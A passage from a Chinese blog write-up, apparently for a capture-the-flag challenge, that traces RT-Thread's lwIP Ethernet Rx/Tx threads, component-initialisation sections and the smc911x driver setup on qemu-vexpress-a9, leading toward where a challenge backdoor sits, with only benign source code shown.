<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">eth_system_device_init_private</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">rt_err_t</span> result = RT_EOK;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize Rx thread. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LWIP_NO_RX_THREAD</span></span><br><span class="line">    <span class="comment">/* initialize mailbox and create Ethernet Rx thread */</span></span><br><span class="line">    result = rt_mb_init(&amp;eth_rx_thread_mb, <span class="string">"erxmb"</span>,</span><br><span class="line">                        &amp;eth_rx_thread_mb_pool[<span class="number">0</span>], <span class="keyword">sizeof</span>(eth_rx_thread_mb_pool)/<span class="number">4</span>,</span><br><span class="line">                        RT_IPC_FLAG_FIFO);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line"></span><br><span class="line">    result = rt_thread_init(&amp;eth_rx_thread, <span class="string">"erx"</span>, eth_rx_thread_entry, RT_NULL,</span><br><span class="line">                            &amp;eth_rx_thread_stack[<span class="number">0</span>], <span class="keyword">sizeof</span>(eth_rx_thread_stack),</span><br><span class="line">                            RT_ETHERNETIF_THREAD_PREORITY, <span class="number">16</span>);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line">    result = rt_thread_startup(&amp;eth_rx_thread);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* initialize Tx thread */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> LWIP_NO_TX_THREAD</span></span><br><span class="line">    <span class="comment">/* initialize mailbox and create Ethernet Tx thread */</span></span><br><span class="line">    result = rt_mb_init(&amp;eth_tx_thread_mb, <span class="string">"etxmb"</span>,</span><br><span class="line">                        &amp;eth_tx_thread_mb_pool[<span class="number">0</span>], <span class="keyword">sizeof</span>(eth_tx_thread_mb_pool)/<span class="number">4</span>,</span><br><span class="line">                        RT_IPC_FLAG_FIFO);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line"></span><br><span class="line">    result = rt_thread_init(&amp;eth_tx_thread, <span class="string">"etx"</span>, eth_tx_thread_entry, RT_NULL,</span><br><span class="line">                            &amp;eth_tx_thread_stack[<span class="number">0</span>], <span class="keyword">sizeof</span>(eth_tx_thread_stack),</span><br><span class="line">                            RT_ETHERNETIF_THREAD_PREORITY, <span class="number">16</span>);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line"></span><br><span class="line">    result = rt_thread_startup(&amp;eth_tx_thread);</span><br><span class="line">    RT_ASSERT(result == RT_EOK);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们看看 erx 线程主要干了什么事情：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ethernet Rx Thread */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">eth_rx_thread_entry</span><span class="params">(<span class="keyword">void</span>* parameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eth_device</span>* <span class="title">device</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 尝试从邮箱中读取邮件，如果没有邮件则一直阻塞</span></span><br><span class="line">        <span class="keyword">if</span> (rt_mb_recv(&amp;eth_rx_thread_mb, (<span class="keyword">rt_ubase_t</span> *)&amp;device, RT_WAITING_FOREVER) == RT_EOK)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">rt_base_t</span> level;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pbuf</span> *<span class="title">p</span>;</span></span><br><span class="line">            ...</span><br><span class="line">            <span class="comment">/* receive all of buffer */</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(device-&gt;eth_rx == RT_NULL) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 调用注册的 eth_rx 函数，从 device 中接收数据</span></span><br><span class="line">                p = device-&gt;eth_rx(&amp;(device-&gt;parent));</span><br><span class="line">                <span class="keyword">if</span> (p != RT_NULL)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* notify to upper layer */</span></span><br><span class="line">                    <span class="comment">// 在这里将接收到的数据传给 TCPIP 线程</span></span><br><span class="line">                    <span class="keyword">if</span>( device-&gt;netif-&gt;input(p, device-&gt;netif) != ERR_OK )</span><br><span class="line">                    &#123;</span><br><span class="line">                        LWIP_DEBUGF(NETIF_DEBUG, (<span class="string">"ethernetif_input: Input error\n"</span>));</span><br><span class="line">                        pbuf_free(p);</span><br><span class="line">                        p = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            LWIP_ASSERT(<span class="string">"Should not happen!\n"</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中可以得知，该线程会循环<strong>读取邮箱 -&gt; 从 device 中读取数据 -&gt; 把读取的数据传给 TCPIP 线程</strong>这样的一个过程。</p>
<p>而另一个 etx  线程主要用于和硬件打交道，将 TCPIP 线程发至 etx 线程的数据转发给具体的 device 执行发包操作，待发包完成后发送 ack 回 TCPIP 线程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Ethernet Tx Thread */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">eth_tx_thread_entry</span><span class="params">(<span class="keyword">void</span>* parameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eth_tx_msg</span>* <span class="title">msg</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 阻塞读取邮件</span></span><br><span class="line">        <span class="keyword">if</span> (rt_mb_recv(&amp;eth_tx_thread_mb, (<span class="keyword">rt_ubase_t</span> *)&amp;msg, RT_WAITING_FOREVER) == RT_EOK)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">eth_device</span>* <span class="title">enetif</span>;</span></span><br><span class="line"></span><br><span class="line">            RT_ASSERT(msg-&gt;netif != RT_NULL);</span><br><span class="line">            RT_ASSERT(msg-&gt;buf   != RT_NULL);</span><br><span class="line"></span><br><span class="line">            enetif = (struct eth_device*)msg-&gt;netif-&gt;state;</span><br><span class="line">            <span class="keyword">if</span> (enetif != RT_NULL)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* call driver's interface */</span></span><br><span class="line">                <span class="comment">// 尝试发包</span></span><br><span class="line">                <span class="keyword">if</span> (enetif-&gt;eth_tx(&amp;(enetif-&gt;parent), msg-&gt;buf) != RT_EOK)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* transmit eth packet failed */</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* send ACK */</span> <span class="comment">// 发包完了之后发送 ACK 回到 TCPIP</span></span><br><span class="line">            rt_completion_done(&amp;msg-&gt;ack);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="c-hw-init">c. hw_init</h3>
<p>上面是 lwIP 中关于 etx 和 erx 线程的初始化。实际的数据收发操作都是由具体的硬件来完成，那硬件是怎么注册的呢？</p>
<p>这里以 <code>qemu-vexpress-a9</code> 设备为例（没错就是 flag 题所用设备）</p>
<p>根据以下调用链：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  This function will call all levels of initialization functions to complete</span></span><br><span class="line"><span class="comment"> *         the initialization of the system, and finally start the scheduler.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">rtthread_startup</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">=&gt; 调用 =&gt; </span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  This function will create and start the main thread, but this thread</span></span><br><span class="line"><span class="comment"> *         will not run until the scheduler starts.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> rt_application_init(<span class="keyword">void</span>);</span><br><span class="line"></span><br><span class="line">=&gt; 创建 main 线程，线程执行函数 =&gt;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  The system main thread. In this thread will call the rt_components_init()</span></span><br><span class="line"><span class="comment"> *         for initialization of RT-Thread Components and call the user's programming</span></span><br><span class="line"><span class="comment"> *         entry main().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> main_thread_entry(<span class="keyword">void</span> *parameter);</span><br><span class="line"></span><br><span class="line">=&gt; 调用 =&gt; </span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  RT-Thread Components Initialization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> rt_components_init(<span class="keyword">void</span>);</span><br></pre></td></tr></table></figure>
<p>我们可以找到函数 <code>rt_components_init</code> 的实现：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief  RT-Thread Components Initialization.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rt_components_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> RT_DEBUG_INIT</span></span><br><span class="line">    [...]</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">const</span> <span class="keyword">init_fn_t</span> *fn_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (fn_ptr = &amp;__rt_init_rti_board_end; fn_ptr &lt; &amp;__rt_init_rti_end; fn_ptr ++)</span><br><span class="line">    &#123;</span><br><span class="line">        (*fn_ptr)();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* RT_DEBUG_INIT */</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>这里，是不是很像先前使用 IDA 反编译 backdoor 向上找交叉引用的地方？</p>
</blockquote>
<p>我们可以看到，该函数会遍历从 <code>__rt_init_rti_board_end -&gt; __rt_init_rti_end</code> 上的每个函数指针，并执行。这两个函数指针代表了什么呢？阅读一下相关的代码和注释：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Components Initialization will initialize some driver and components as following</span></span><br><span class="line"><span class="comment"> * order:</span></span><br><span class="line"><span class="comment"> * rti_start         --&gt; 0</span></span><br><span class="line"><span class="comment"> * BOARD_EXPORT      --&gt; 1</span></span><br><span class="line"><span class="comment"> * rti_board_end     --&gt; 1.end</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * DEVICE_EXPORT     --&gt; 2</span></span><br><span class="line"><span class="comment"> * COMPONENT_EXPORT  --&gt; 3</span></span><br><span class="line"><span class="comment"> * FS_EXPORT         --&gt; 4</span></span><br><span class="line"><span class="comment"> * ENV_EXPORT        --&gt; 5</span></span><br><span class="line"><span class="comment"> * APP_EXPORT        --&gt; 6</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * rti_end           --&gt; 6.end</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * These automatically initialization, the driver or component initial function must</span></span><br><span class="line"><span class="comment"> * be defined with:</span></span><br><span class="line"><span class="comment"> * INIT_BOARD_EXPORT(fn);</span></span><br><span class="line"><span class="comment"> * INIT_DEVICE_EXPORT(fn);</span></span><br><span class="line"><span class="comment"> * ...</span></span><br><span class="line"><span class="comment"> * INIT_APP_EXPORT(fn);</span></span><br><span class="line"><span class="comment"> * etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rti_start</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">INIT_EXPORT(rti_start, <span class="string">"0"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rti_board_start</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">INIT_EXPORT(rti_board_start, <span class="string">"0.end"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rti_board_end</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">INIT_EXPORT(rti_board_end, <span class="string">"1.end"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">rti_end</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">INIT_EXPORT(rti_end, <span class="string">"6.end"</span>);</span><br></pre></td></tr></table></figure>
<p>还有这个宏定义：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_EXPORT(fn, level)                                                       \</span></span><br><span class="line">            RT_USED <span class="keyword">const</span> <span class="keyword">init_fn_t</span> __rt_init_#<span class="meta">#fn RT_SECTION(<span class="meta-string">".rti_fn."</span> level) = fn</span></span><br></pre></td></tr></table></figure>
<p>可以得出结论：对于编译出来的二进制文件中，存在一个数据段，名为 <code>.rti_fn</code>。这个段上存放着一些函数指针，用于初始化一系列设备等等；而刚刚所说的两个函数指针所表示的是<strong>注册在这个段上的两个函数指针，用于标识段上特定类型函数指针的位置</strong>。</p>
<p>这里我们可以看到，使用宏 <code>INIT_APP_EXPORT</code> 声明的设备，其函数指针也会存放在 <strong>__rt_init_rti_board_end -&gt; __rt_init_rti_end</strong> 这个范围。</p>
<blockquote>
<p>也就是说使用 INIT_APP_EXPORT 声明的设备，其初始化函数会在 <code>rt_components_init</code> 中执行。</p>
</blockquote>
<h3 id="d-smc911-init">d. smc911_init</h3>
<p>接下来我们看看 <code>smc911x</code> 设备驱动，也就是 backdoor 所在的设备驱动 （<code>bsp\qemu-vexpress-a9\drivers\drv_smc911x.c</code>）。</p>
<p>可以看到，该文件中存在这样的一条语句：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INIT_APP_EXPORT(smc911x_emac_hw_init);</span><br></pre></td></tr></table></figure>
<p>也就是说 smc911x 设备将初始化函数 <code>smc911x_emac_hw_init</code> 注册进了 <code>.rti_fn</code> 段中，等待被函数 <code>rt_components_init</code> 所调用。<br>
而 <code>smc911x_emac_hw_init</code> 函数源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">smc911x_emac_hw_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _emac.iobase = VEXPRESS_ETH_BASE;</span><br><span class="line">    <span class="comment">// 设置中断号</span></span><br><span class="line">    _emac.irqno  = IRQ_VEXPRESS_A9_ETH;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* set INT CFG */</span></span><br><span class="line">    smc911x_reg_write(&amp;_emac, LAN9118_IRQ_CFG, LAN9118_IRQ_CFG_IRQ_POL | LAN9118_IRQ_CFG_IRQ_TYPE);</span><br><span class="line">    ...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RT_USING_DEVICE_OPS</span></span><br><span class="line">    _emac.parent.parent.ops        = &amp;smc911x_emac_ops;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    _emac.parent.parent.init       = smc911x_emac_init;</span><br><span class="line">    _emac.parent.parent.open       = RT_NULL;</span><br><span class="line">    _emac.parent.parent.close      = RT_NULL;</span><br><span class="line">    _emac.parent.parent.read       = RT_NULL;</span><br><span class="line">    _emac.parent.parent.write      = RT_NULL;</span><br><span class="line">    _emac.parent.parent.control    = smc911x_emac_control;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    _emac.parent.parent.user_data  = RT_NULL;</span><br><span class="line">    <span class="comment">// 注意! 这里设置了 eth_rx 和 eth_tx 方法</span></span><br><span class="line">    _emac.parent.eth_rx     = smc911x_emac_rx;</span><br><span class="line">    _emac.parent.eth_tx     = smc911x_emac_tx;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* register ETH device */</span></span><br><span class="line">    <span class="comment">// 对 eth device 进行初始化</span></span><br><span class="line">    eth_device_init(&amp;(_emac.parent), <span class="string">"e0"</span>);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数主要设置了一些操作（ops），例如 <code>smc911x_emac_init</code>、<code>smc911x_emac_rx</code>、<code>smc911x_emac_tx</code>。我们可以看到该函数为结构体 <code>_emac</code> 设置了 <code>eth_rx</code> 和 <code>eth_tx</code> 字段，因此当 lwIP 线程需要收发信息时，会调用该设备的 <code>smc911x_emac_rx</code>、<code>smc911x_emac_tx</code> 这两个函数。</p>
<p>这里比较有意思的是结构体 <code>_emac</code> 的类继承关系：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eth_device_smc911x</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* inherit from Ethernet device */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">eth_device</span> <span class="title">parent</span>;</span></span><br><span class="line">    <span class="comment">/* interface address info. */</span></span><br><span class="line">    <span class="keyword">rt_uint8_t</span> enetaddr[MAX_ADDR_LEN];         <span class="comment">/* MAC address  */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> iobase;</span><br><span class="line">    <span class="keyword">uint32_t</span> irqno;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这里存在一个 parent 结构体，类似于 C++ 中的继承，表示了一个具体的以太网设备。而该 <code>eth_device</code> 结构体源码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eth_device</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* inherit from rt_device */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_device</span> <span class="title">parent</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* network interface for lwip */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">netif</span> *<span class="title">netif</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rt_semaphore</span> <span class="title">tx_ack</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">rt_uint16_t</span> flags;</span><br><span class="line">    <span class="keyword">rt_uint8_t</span>  link_changed;</span><br><span class="line">    <span class="keyword">rt_uint8_t</span>  link_status;</span><br><span class="line">    <span class="keyword">rt_uint8_t</span>  rx_notice;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* eth device interface */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pbuf</span>* (*<span class="title">eth_rx</span>)(<span class="title">rt_device_t</span> <span class="title">dev</span>);</span></span><br><span class="line">    <span class="keyword">rt_err_t</span> (*eth_tx)(<span class="keyword">rt_device_t</span> dev, struct pbuf* p);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">rt_err_t</span> <span class="title">eth_device_ready</span><span class="params">(struct eth_device* dev)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">rt_err_t</span> <span class="title">eth_device_init</span><span class="params">(struct eth_device * dev, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">rt_err_t</span> <span class="title">eth_device_init_with_flag</span><span class="params">(struct eth_device *dev, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">rt_uint16_t</span> flag)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">rt_err_t</span> <span class="title">eth_device_linkchange</span><span class="params">(struct eth_device* dev, <span class="keyword">rt_bool_t</span> up)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">eth_system_device_init</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个结构体描述了一个抽象的以太网设备接口，其中这些函数指针在 lwIP 层会被调用。</p>
<p>注意到最后 <code>smc911x_emac_hw_init</code> 函数执行了一下 <code>eth_device_init</code> 函数，而该函数最终会调用到 <code>smc911x_emac_init</code> 函数，在其中<strong>注册中断处理例程 smc911x_isr</strong>：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rt_hw_interrupt_install(emac-&gt;irqno, smc911x_isr, emac, <span class="string">"smc911x"</span>);</span><br></pre></td></tr></table></figure>
<p>当以太网设备有数据发出中断后，中断处理例程 <code>smc911x_isr</code> 被调用，如果数据准备好了，则调用 <code>eth_device_ready</code>：</p>
